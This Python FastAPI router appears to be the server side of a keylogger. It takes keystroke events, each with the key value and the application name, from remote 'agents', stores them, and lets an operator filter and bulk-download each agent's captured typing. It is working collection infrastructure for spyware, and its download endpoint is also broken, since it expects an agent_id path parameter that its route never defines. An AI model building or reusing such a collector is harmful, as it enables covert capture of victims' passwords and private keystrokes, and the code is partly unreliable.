from datetime import datetime
import json
from fastapi import APIRouter, Depends, Query, Path, Body
from fastapi.responses import StreamingResponse
from sqlalchemy.orm import Session

from app.db.database import get_db
from app.models import Keylog

router = APIRouter(prefix="/keylogs", tags=["Keylogs"])

@router.post("/{agent_id}")
def ingest_keylogs(
    agent_id: str = Path(..., description="Unique ID of the agent sending the keylog events"),
    data: dict = Body(..., description="JSON object containing an 'events' array with keylog events"),
    db: Session = Depends(get_db)
):
    """
    Ingest keylog events for a specific agent. The request body should contain a JSON object with an "events" array, where each event has the following structure:
{
    "ts": "2024-06-01T12:00:00Z",
    "app": "chrome.exe",
    "type": "keypress",
    "value": "a"
}
    """
    events = data.get("events", [])

    objs = []

    for e in events:
        objs.append(
            Keylog(
                agent_id=agent_id,
                timestamp=datetime.fromisoformat(e["ts"].replace("Z", "")),
                app=e.get("app"),
                type=e.get("type"),
                value=e.get("value"),
            )
        )

    db.bulk_save_objects(objs)
    db.commit()

    return {"inserted": len(objs)}

@router.get("/")
def get_keylogs(
    agent_id: str = Query(..., description="ID of the agent to retrieve keylogs for"),
    start_time: str | None = Query(None, description="Filter by start time (eg. '2024-06-01T00:00:00Z')"),
    end_time: str | None = Query(None, description="Filter by end time (eg. '2024-06-01T00:00:00Z')"),
    app: str | None = Query(None, description="Filter by application name (case-insensitive, partial match)"),
    type: str | None = Query(None, description="Type of keylog event (e.g., 'keypress', 'keydown', 'keyup')"),
    limit: int = Query(100, ge=1, le=1000, description="Limit must be between 1 and 1000"),
    offset: int = Query(0, ge=0, description="Offset must be non-negative"),
    db: Session = Depends(get_db),
):
    """
    Retrieve keylogs for a specific agent with optional filtering by time range, application, and type.
    """
    query = db.query(Keylog).filter(Keylog.agent_id == agent_id)

    if start_time:
        query = query.filter(
            Keylog.timestamp >= datetime.fromisoformat(start_time)
        )

    if end_time:
        query = query.filter(
            Keylog.timestamp <= datetime.fromisoformat(end_time)
        )

    if app:
        app = app.lower()
        query = query.filter(Keylog.app.ilike(f"%{app}%"))

    if type:
        type = type.lower()
        query = query.filter(Keylog.type.ilike(f"%{type}%"))

    total = query.count()

    results = (
        query.order_by(Keylog.timestamp.desc())
        .offset(offset)
        .limit(limit)
        .all()
    )

    return {
        "total": total,
        "limit": limit,
        "offset": offset,
        "data": results
    }

@router.get("/download")
def download_keylogs(
    agent_id: str = Path(..., description="ID of the agent to download keylogs for"), 
    db: Session = Depends(get_db)
):
    """
    Download all keylogs for a specific agent as a JSON Lines file.
    """
    query = (
        db.query(Keylog)
        .filter(Keylog.agent_id == agent_id)
        .order_by(Keylog.timestamp.asc())
    )

    def generate():
        for log in query:
            yield json.dumps({
                "ts": log.timestamp.isoformat() + "Z",
                "app": log.app,
                "type": log.type,
                "value": log.value
            }) + "\n"

    return StreamingResponse(
        generate(),
        media_type="application/jsonl",
        headers={
            "Content-Disposition": f"attachment; filename={agent_id}_keylogs.jsonl"
        },
    )